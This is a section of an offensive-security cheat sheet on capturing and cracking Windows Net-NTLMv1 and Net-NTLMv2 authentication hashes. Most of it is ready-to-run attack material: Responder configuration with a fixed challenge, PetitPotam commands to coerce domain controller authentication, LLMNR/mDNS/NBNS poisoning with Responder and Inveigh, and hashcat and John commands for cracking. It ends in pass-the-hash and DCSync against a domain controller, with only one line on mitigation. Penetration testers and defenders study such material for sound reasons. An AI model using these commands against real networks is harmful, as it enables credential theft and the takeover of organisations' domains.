# Hash - Capture and Cracking

## Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens

> Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication. They are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys. 

:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to **NetNTLMv1 Challenge/Response authentication**. This uses the outdated encryption method DES to protect the NT/LM Hashes.

**Requirements**:

* LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)

**Exploitation**:

* Capturing using Responder: Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge
    ```ps1
    HTTPS = On
    DNS = On
    LDAP = On
    ...
    ; Custom challenge.
    ; Use "Random" for generating a random challenge for each requests (Default)
    Challenge = 1122334455667788
    ```
* Fire Responder: `responder -I eth0 --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication
* Force a callback:
    ```ps1
    PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
    ```
* If you got some `NetNTLMv1 tokens`, you can try to **shuck** them online via [Shuck.Sh](https://shuck.sh/) or locally/on-premise via [ShuckNT](https://github.com/yanncam/ShuckNT/) to get NT-hashes corresponding from [HIBP database](https://haveibeenpwned.com/Passwords). If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash ([pass-the-hash](#pass-the-hash) ready) instantly. The [shucking process](https://www.youtube.com/watch?v=OQD3qDYMyYQ&ab_channel=PasswordVillage) works for any NetNTLMv1 with or without ESS/SSP (challenge != `1122334455667788`) but mainly for user account (plaintext previsouly leaked).
    ```ps1
    # Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php
    # Or shuck them on-premise via ShuckNT script:
    $ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin
	[...]
	10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.

    ```
* If you got some `NetNTLMv1 tokens`, you can also try to crack them via [Crack.Sh](https://crack.sh/) (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on [Crack.Sh](https://crack.sh/netntlm/). The Converter of [Shuck.Sh](https://shuck.sh/) can be used to convert format easily.
    ```ps1
    # When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):
    username::hostname:response:response:challenge -> NTHASH:response
    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972

    # When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:
    username::hostname:lmresponse+0padding:ntresponse:challenge -> $NETNTLM$challenge$ntresponse
    $NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E
    ```
* Finaly, if no [Shuck.Sh](https://shuck.sh/) nor [Crack.Sh](https://crack.sh/) can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper
    ```ps1
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP) to plaintext (for user account)
    hashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash (for user and computer account, depending on nthash-wordlist quality)
    hashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.
    ```
* Now you can DCSync using the Pass-The-Hash with the DC machine account

:warning: NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= `1122334455667788`, so chargeable on [Crack.Sh](https://crack.sh/)).

:warning: NetNTLMv1 format is `login::domain:lmresp:ntresp:clientChall`. If the `lmresp` contains a **0's-padding** this means that the token is protected by **ESS/SSP**.

:warning: NetNTLMv1 final challenge is the Responder's challenge itself (`1122334455667788`) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the [Shuck.Sh Generator](https://shuck.sh/generator.php) and detailed in [MISCMag#128](https://connect.ed-diamond.com/misc/misc-128/shuck-hash-before-trying-to-crack-it).

:warning: If you get some tokens from other tools ([hostapd-wpe](https://github.com/OpenSecurityResearch/hostapd-wpe) or [chapcrack](https://github.com/moxie0/chapcrack)) in other formats, like tokens starting with the prefix `$MSCHAPv2$`, `$NETNTLM$` or `$99$`, they correspond to a classic NetNTLMv1 and can be converted from one format to another [here](https://shuck.sh/converter.php).


**Mitigations**: 

* Set the Lan Manager authentication level to `Send NTLMv2 responses only. Refuse LM & NTLM`


## Capturing and cracking Net-NTLMv2/NTLMv2 hashes

If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.

```powershell
# https://github.com/lgandx/Responder
$ sudo ./Responder.py -I eth0 -wfrd -P -v

# https://github.com/Kevin-Robertson/InveighZero
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]

# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```

Crack the hashes with Hashcat / John The Ripper

```ps1
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```
